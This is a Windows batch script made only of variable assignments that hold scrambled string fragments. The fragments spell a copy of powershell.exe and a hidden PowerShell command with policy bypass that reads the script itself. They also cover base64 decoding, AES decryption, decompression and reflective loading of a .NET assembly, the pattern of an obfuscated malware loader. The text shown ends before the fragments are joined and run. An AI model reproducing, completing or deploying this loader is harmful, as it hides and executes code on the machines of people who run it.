@echo off
set "IUGAZGGyiV=ow"
set "DOBIPCySTq=st"
set "EdYuHLLDPl=Po"
set "JqxKziglky=:\"
set "gzuSJjjSPc=he"
set "ZFDRcsMTCJ=s\"
set "OqdxaaHhyJ=\v"
set "yrSxOzcjJI=co"
set "UTZmlYyIEk=in"
set "mUMrFgzjGQ=he"
set "twkhyZWSmE=xe"
set "UdSUSIWLsL=.e"
set "nEvRWYIXeU=rS"
set "ieZmyAbLPv= /"
set "XdjHegQOpz=py"
set "xgMANlRhDi= C"
set "igIbrleVbA=\W"
set "goXwIJCuzz=we"
set "gvKneqYOty=ll"
set "zrKWNsWPpS=we"
set "wftSXeTNky=Wi"
set "sdXeThyzQh=Sy"
set "EVlcirLDWn=ws"
set "FLPajFXCHR=32"
set "jyDoBSYAzk=do"
set "LKydndGAab=y "
set "unqlcSIRVa=ll"
set "yuFozJYaVB=em"
set "cNyVYlCGRB=1."
set "ktOJtRTiMG=0\"
set "NrXSouCuei=rs"
set "pBRYUsFsKC=nd"
set "ZTDGfVQoqF=po"
set "nkweCPUwwu= %~dp0"
set "YuagmieWUO=cd"
set "UzwdTpstAm='[-1"
set "hceFvHWqef=L4Yi"
set "hIjmxqhHUh=tS46"
set "CkIqPYqtkf=$IEn"
set "SqdHpqwIuR=ypto"
set "lbHfPxNxkm=rity"
set "tqhkkAZMIk=);$M"
set "tDSwxoMaRR=);$g"
set "ZZiHsvUGJT=ment"
set "dkGlIgPNth=Star"
set "qopFKtRYGy=ke($"
set "edbEGansfZ=.Ass"
set "hdCylIHGSL=ew-O"
set "MlJosjTGWs=m(, "
set "MDcgVRYuqB=join"
set "IpuaUzrFSR=form"
set "ykeuMddoXy=PTtG"
set "waNfgWPiFY=orF'"
set "QuRzUTecpv=c) {"
set "mgTucrwZAb=ysZI"
set "AUCihBGaPQ=y.Pa"
set "nZKWBEUzHA=jnuW"
set "tpFuvUyYYf=F'[-"
set "YVDWCWtBaX=wip "
set "TmPmFDZVRs=$AZI"
set "uhfcdYbiaL=.Cry"
set "sNlQaGGVsW=oryS"
set "RmTvoYnstH=ress"
set "LjoPyHfZKH=rtS4"
set "bzxBSTPHnT=Mode"
set "YqBKBPxuEV=gnir"
set "uYWcTALJOS=.Dis"
set "xixVgfpzae=fore"
set "pvOGQyVaUM=; };"
set "wZvEbASOVB=YX.T"
set "fEUqAPwXgN=ptog"
set "sLLhAveypF=n ''"
set "qMbOnbRBbB=embl"
set "FWvXsHpHQz=Disp"
set "czFtQfHwbe=.Cry"
set "OdUlGucgjZ=pose"
set "ErsOeylIAM=oArr"
set "TaLZrSDvlh=vZlF"
set "egbuLsPgOp=[Env"
set "CvrSJFVdHG=pres"
set "XQoVyaMWOr=pose"
set "insBmOrzQb= [st"
set "LkmdHorMvC=tem."
set "tNZXAkeWyC=em.C"
set "vIfaYiqQRx=ZIYX"
set "SOmbHWNADW=.IO."
set "TKpEdLLeIX=Mjnu"
set "ZQkAwbekBf=PxEW"
set "mkxVrCMyrR=F.En"
set "pZBCGcugIm=saBm"
set "eJjPmdefpZ=m.IO"
set "JwRBwDzqoc= New"
set "IAqhCawgTA=esMa"
set "aWunnNslLg=-joi"
set "EPTIiZHpXT=;$om"
set "bQrxVaNsqs=gMod"
set "cXFhbQKJnr=6esa"
set "KhastVvhBJ='gni"
set "dakzUecKcS=k; }"
set "PvhQdZjkhk=pStr"
set "HjVsKrcuYU=stem"
set "wozTnGtXss=-4] "
set "ZolgqfPLNv=fzNn"
set "FSdeMtSDAV=('Tg"
set "KBJpWbklQe=yste"
set "LflbEptlFz=comp"
set "nbXqvwyVpG=New-"
set "tjxVxhdXgz=morF"
set "OFkqvEivDx=daeR"
set "TDKPvHHuHd=Obje"
set "JbbcFZlGuX=ecry"
set "UKPJpiJGqV=odBU"
set "XlGjKOlCec=eam("
set "bSmIfnwCRj=ispo"
set "cJUqNNZsmv=Conv"
set "mnviBsxjZb=.Dis"
set "LdXCljqHkg=rity"
set "zJsUjDODlL=bstr"
set "hCjennsEMI=Y = "
set "PtNWrGJUtJ=('%~f0'"
set "XDOTTeYtbp=ne);"
set "zhOaIzwkud=sion"
set "MZDZjlyVDn=] -j"
set "RgbdJoqBbP=;$om"
set "wZMNjBxgmO=$Mjn"
set "nPCyohoMXX=-joi"
set "BzQVrWgVTX=[Sys"
set "tounjKyQLk=X = "
set "MBGSCXlnOp=6] -"
set "DxhaoLsAAb=.Con"
set "RYwtYQqYnN=ct S"
set "vqNKkAZPyq=gth)"
set "XAdiaDTIUZ=th('"
set "ZMYNnxtSUh=ewLi"
set "QgQbcTwtyK=zodB"
set "KXMaiVchgi=ring"
set "yqKuwhkKTI=and "
set "eoJQDxpDVB=hy.A"
set "uNhPzNcJjJ=YxVw"
set "EXovZqzyku=am;$"
set "efFkZKmABh=RmAx"
set "PvQgDMxesG=nage"
set "JBqzKugwHS=zHhH"
set "oiKYgXXaCe=raph"
set "WnIGhPiAGG=yste"
set "wDvKfUZGDk='txe"
set "yJGEYVeyXn=;$ic"
set "mKiaomRuxt=oL'["
set "qANiRlelYP=urit"
set "xFIIpsTaZb=ert]"
set "tHcPzUTdZG=zNnY"
set "OrgbzlaSVp=le  "
set "oTYkbhXxrI=BU.D"
set "ZegdDhPGhU=trea"
set "dCZgovvUZB=IEnu"
set "EyzqWHkSPu=.Sec"
set "kHhwhQIPkF=bypa"
set "IJMERrYJZT=bjec"
set "SJZuBNeSyE=V = "
set "NZYasZkbsn=YX ="
set "vTUQklcMjZ=e]::"
set "EaTeLqysPF=$fzN"
set "EEcofORoyW=nY ="
set "nWmhllvTcj=ing("
set "rWnefHVfvW=rt]:"
set "lLTjFrAuxY=16] "
set "xiMsZqvEzk=nY);"
set "tNKnmEdjjA=m.Re"
set "eMNxNWHZRG=]::("
set "VYgLFDjILD=:('g"
set "nfAKkuEBqI=tryP"
set "inmIaxrpTj=g = "
set "nMAElCOfAF===')"
set "jqspnHpPug=-1.."
set "HNHvdyTnxF=em.I"
set "HHBXtPwgeh=vert"
set "zyuHEjHQQO=brea"
set "tMJWlaNdbB=.Cop"
set "nOEhBfzMEd=ress"
set "OhiWvvZKBI=y.Cr"
set "wSwJJstols=YX);"
set "PivALaXNOG==');"
set "tNqoXtcUjl=mory"
set "EqsDEdZmdn=wip."
set "IJseGdEijk=Fina"
set "QIokEMBSrC=1..-"
set "bUDOnBPQHT=tem."
set "jaQAyCDFda=-nop"
set "IlIlgizcNt= [Sy"
set "PfPuUeXjgh=);$M"
set "qlckgeZdJN=[IO."
set "aOVNbhBSJZ=O.Me"
set "PWZrzwUzyV=t Sy"
set "yrKsIhavIV=[Sys"
set "mjAumRtKvA=join"
set "MhQceadRqh=Comp"
set "qphDNogJtq=qhxr"
set "SZnBfAAALy=rans"
set "LsgUmbynhH=$zod"
set "slTpNtJbaB=);$A"
set "icOBFhpMDa=]::N"
set "YTjLvaSuQf=tion"
set "ipHilTmyjL=oint"
set "heblRQIynY=Secu"
set "IXzbkUKKUB=Syst"
set "oGEquBgVZD=se()"
set "jVKnCQpdHi=lFE "
set "RBCNGAlgMJ=null"
set "XXNlNhkXjO= if "
set "RikSWWJTWU=)) {"
set "VZYnQdZYWI=cX, "
set "sWTYnAOOIH=..-1"
set "gNjRxtWBXj=gjYA"
set "eLlxyisvzz=();$"
set "STcfguOTag=zNnY"
set "tChPveKORf= [Sy"
set "zZYTaORRMa=uoF "
set "MJtdwVOcZC=('da"
set "fvgfzhfllF=nirt"
set "LdxLvPpkld= = $"
set "bAbkWFTdDw=ct S"
set "PRPtVdffcW=CFxo"
set "WZYqfOgwtI= = $"
